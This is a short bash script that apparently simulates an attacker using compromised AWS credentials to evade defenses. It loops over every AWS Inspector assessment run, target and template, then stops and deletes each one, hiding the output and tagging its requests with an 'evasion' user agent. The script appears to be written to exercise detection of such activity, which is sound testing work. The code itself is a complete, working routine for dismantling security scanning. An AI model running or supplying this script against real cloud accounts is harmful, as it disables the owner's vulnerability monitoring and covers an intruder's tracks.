#!/bin/bash

LOGFILE=/tmp/attacker_compromised_credentials_evasion.sh.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done

log "Setting User-agent: AWS_EXECUTION_ENV=evasion"
export AWS_EXECUTION_ENV="evasion"

log "Starting..."

# install preqs
yum install -y jq

opts="--output json --color off --no-cli-pager"
# evasion inspector
for row in $(aws inspector list-assessment-runs --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    log "Running: aws inspector stop-assessment-run --assessment-run-arn \"$ID\" $opts"
    aws inspector stop-assessment-run --assessment-run-arn "$ID" $opts > /dev/null 2>&1
    log "Running: aws inspector delete-assessment-run --assessment-run-arn \"$ID\" $opts"
    aws inspector delete-assessment-run --assessment-run-arn "$ID" $opts > /dev/null 2>&1
done
for row in $(aws inspector list-assessment-targets --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    log "Running: aws inspector delete-assessment-target --assessment-target-arn \"$ID\" $opts"
    aws inspector delete-assessment-target --assessment-target-arn "$ID" $opts > /dev/null 2>&1
done
for row in $(aws inspector list-assessment-templates --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    log "Running: aws inspector delete-assessment-template --assessment-template-arn \"$ID\" $opts"
    aws inspector delete-assessment-template --assessment-template-arn "$ID" $opts > /dev/null 2>&1
done

log "Done."